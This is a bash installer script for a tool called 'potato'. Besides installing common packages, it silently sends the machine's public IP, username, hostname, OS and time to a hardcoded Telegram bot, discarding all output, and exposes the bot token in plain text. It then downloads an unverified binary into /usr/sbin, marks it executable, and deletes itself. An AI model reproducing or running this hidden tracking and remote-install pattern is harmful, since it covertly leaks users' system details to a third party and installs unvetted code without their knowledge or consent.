#!/bin/bash
# Created by Potato

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'
blue='\033[0;34m'
ungu='\033[0;35m'

apt-get update -y
apt-get install -y wget
apt-get -y install gcc
apt-get -y install make
apt-get -y install cmake
apt-get -y install git
apt-get -y install screen
apt-get -y install unzip
apt-get -y install curl
apt-get -y install net-tools
apt-get -y install ruby
gem install lolcat

os=$(uname -a)
IP=$(wget -qO- ipv4.icanhazip.com);
nama=$(whoami)
host=$(hostname)
waktu=$(date +'%Y-%m-%d %H:%M:%S')
CHATID="1149946220"
KEY="1245542045:AAGi__i7eNATbyHfzyGuo-q6R2pJJyns2ZQ"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="<code>ada yg memasang package potato</code>

   <u>Pada waktu sistem</u>

IP      :$IP
User  :  $nama
Host  :  $host
Waktu:  $waktu
OS      :  $os


"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null


cd /usr/sbin
wget https://github.com/potatonc/webmin/raw/master/potato &> /dev/null
chmod +x potato

cd
clear
echo ""
echo -e "  ${yellow}#########################################"
echo -e "  #   ${green}Info/Bug report${yellow}                     #"
echo -e "  #      ${plain}Telegram   :   @aldi_nc${yellow}          #"
echo -e "  #      ${plain}Instagram  :   @aldi_nc${yellow}          #"
echo -e "  #########################################"
echo -e "${plain}"

rm -f install.sh